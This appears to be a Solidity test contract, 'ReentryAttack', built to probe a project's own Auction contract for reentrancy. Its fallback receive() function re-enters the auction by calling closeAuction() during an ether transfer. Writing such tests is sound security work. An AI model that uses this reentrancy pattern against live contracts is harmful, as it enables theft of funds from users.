pragma solidity ^0.6.0;

import "./AuctionForReentry.sol";
import "./CypherpunkCoin.sol";

contract ReentryAttack {
    Auction public auction;
    CypherpunkCoin public token;
    address payable owner;

    // we should send the money to the contract before doing the test
    constructor(address auctionAddress, address payable tokenAddress) public {
        auction = Auction(auctionAddress);
        token = CypherpunkCoin(tokenAddress);
        owner = msg.sender;
    }

    function commit() public payable {
        auction.commit.value(
            // auction.startPrice() * 10**12 * auction.tokenSupply()
            msg.value.div(2)
        )();
    }

    function withdrawTokens() public {
        auction.releaseTokens();
    }

    function withdraw() external {
        owner.transfer(address(this).balance);
    }

    // fallback function
    receive() external payable {
        auction.closeAuction();
    }
}
